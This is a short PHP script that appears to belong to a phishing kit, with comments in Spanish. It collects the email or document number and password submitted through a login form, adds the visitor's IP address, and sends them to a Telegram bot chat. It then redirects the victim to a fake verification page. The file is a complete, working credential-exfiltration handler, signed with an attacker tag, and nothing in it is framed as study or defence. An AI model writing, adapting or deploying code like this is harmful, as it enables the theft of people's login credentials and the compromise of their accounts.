<?php
session_start();
include 'bot.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Sanitizar datos del formulario usando htmlspecialchars()
    $usr = htmlspecialchars($_POST['email'], ENT_QUOTES, 'UTF-8');
    $psw = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');

    // Almacenar el nombre de usuario en la sesión
    $_SESSION['username'] = $usr;

    // Mensaje a enviar
    $ip = $_SERVER['REMOTE_ADDR'];
    $text = "D4V1V13ND4 | @sn0wdie\n----\nD0C: $usr\nP4SWD: $psw\n\nIP: $ip\n----";
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    // Enviar la solicitud HTTP GET a la API de Telegram usando cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Comprobar si el mensaje fue enviado exitosamente
    if ($response) {
        header("Location: ../verificacion.html");
        exit; // Asegúrate de llamar a exit después de redirigir
    } else {
        echo "Error al enviar el mensaje.";
    }
} else {
    die('Método de solicitud no permitido.');
}
?>